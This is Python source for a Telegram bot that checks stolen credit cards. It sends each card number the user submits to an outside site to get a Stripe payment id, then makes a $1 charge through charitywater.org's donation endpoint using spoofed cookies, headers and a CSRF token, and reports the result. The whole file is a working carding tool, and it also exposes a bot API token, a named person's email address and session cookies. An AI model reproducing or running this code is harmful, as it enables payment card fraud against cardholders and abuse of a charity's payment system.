import telebot
import requests
import time

API_TOKEN = '7417416901:AAFbj1kjZkSY7HZunBPQ41N6r8HpQE8YnNg'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please Use The /chk Command For Check Your Cc Bot By :- @ERR0R9.")

@bot.message_handler(commands=['chk'])
def handle_card(message):
    card = message.text[4:].strip()

    response = requests.get(f'https://blackheadsop.cc/api/index.php?card={card}')
    
    if response.status_code == 200:
        json_response = response.json()
        
        if 'payment_id' in json_response:
            payment_id = json_response['payment_id']
            
            start_time = time.time()
            
            cookies = {
                'countrypreference': 'US',
                'optimizelyEndUserId': 'oeu1723351651798r0.7795032707945473',
                '_tt_enable_cookie': '1',
                '_ttp': 'Zg7B9MMaE4tVdLADDJut1UzlKfC',
                '_fbp': 'fb.1.1723351655134.707373566482100899',
                '_gcl_au': '1.1.1600189181.1723351655',
                '_ga': 'GA1.1.1454181426.1723351655',
                'FPAU': '1.1.1600189181.1723351655',
                '__stripe_mid': 'f065a208-195f-474e-b840-e5b7b76830818356ca',
                'builderSessionId': 'a4faeac1d9e54e1c8eb2309e2e262a04',
                'IR_gbd': 'charitywater.org',
                'IR_16318': '1723398420421%7C0%7C1723398420421%7C%7C',
                'analytics_ids': 'M50Djq1k8T9jPAA0iZ2Wf8fQN7bH3jkM6m06O1SBJKZmQep0MFNFbsYWk1vNobaPJpHEJYdQeLZfvAM0bJbL63mFTPHrvux3V2qHlx3R%2FiCSPD744XijlVItZlQhA0ro7yvRQk8ISCHPDhuOHBxI8g88NUmFh%2BbQSJt1JJ5G2Pv8--8a6SbqXTxKdeqiYs--fZCgjEq5PdxFo612J4wbkQ%3D%3D',
                '_ga_5H0VND0XMD': 'GS1.1.1723398428.2.0.1723398428.0.0.1321862210',
                '__stripe_sid': '7af3b6b7-17c6-43ff-b82d-1e3bf2848986c7c94f',
                '_uetsid': 'd38ad150579c11efb34823a22006c22b',
                '_uetvid': 'd38b0470579c11efb986bdf1ef5cbe90',
                '_ga_SKG6MDYX1T': 'GS1.1.1723398420.3.1.1723399459.0.0.154465131',
            }

            headers = {
                'authority': 'www.charitywater.org',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.charitywater.org',
                'referer': 'https://www.charitywater.org/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'x-csrf-token': 'YTd2UvuNGj3_EEpMOxO4_MPi22R49ic0QAr8glf4d7B9gH7LZmy1Qn38LvfI_s1lQywCnKlX1s1cXtdQt6xIyg',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'country': 'us',
                'payment_intent[email]': 'sandeepkhadka00007@gmail.com',
                'payment_intent[amount]': '1',
                'payment_intent[currency]': 'usd',
                'payment_intent[payment_method]': payment_id,
                'disable_existing_subscription_check': 'false',
                'donation_form[amount]': '1',
                'donation_form[comment]': '',
                'donation_form[display_name]': '',
                'donation_form[email]': 'sandeepkhadka00007@gmail.com',
                'donation_form[name]': 'Sandeep',
                'donation_form[payment_gateway_token]': '',
                'donation_form[payment_monthly_subscription]': 'false',
                'donation_form[surname]': 'Khadka',
                'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
                'donation_form[setup_intent_id]': '',
                'donation_form[subscription_period]': '',
                'donation_form[metadata][address][address_line_1]': 'Sandeep Khadka',
                'donation_form[metadata][address][address_line_2]': '',
                'donation_form[metadata][address][city]': 'New York',
                'donation_form[metadata][address][country]': '',
                'donation_form[metadata][address][zip]': '10081',
                'donation_form[metadata][automatically_subscribe_to_mailing_lists]': 'true',
                'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
                'donation_form[metadata][phone_number]': '',
                'donation_form[metadata][plaid_account_id]': '',
                'donation_form[metadata][plaid_public_token]': '',
                'donation_form[metadata][url_params][touch_type]': '1',
                'donation_form[metadata][session_url_params][touch_type]': '1',
                'donation_form[metadata][with_saved_payment]': 'false',
            }

            stripe_response = requests.post('https://www.charitywater.org/donate/stripe', cookies=cookies, headers=headers, data=data)
            elapsed_time = time.time() - start_time

            final_message = (
                f"𝗖𝗮𝗿𝗱: {card}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {stripe_response.text}\n"
                f"Payment Id : {payment_id}\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f} seconds"
            )
            
            bot.reply_to(message, final_message)
        else:
            bot.reply_to(message, "Error: No Cc Found In The Response.")
    else:
        bot.reply_to(message, "Error: Failed To Connect To The API.")

bot.polling()
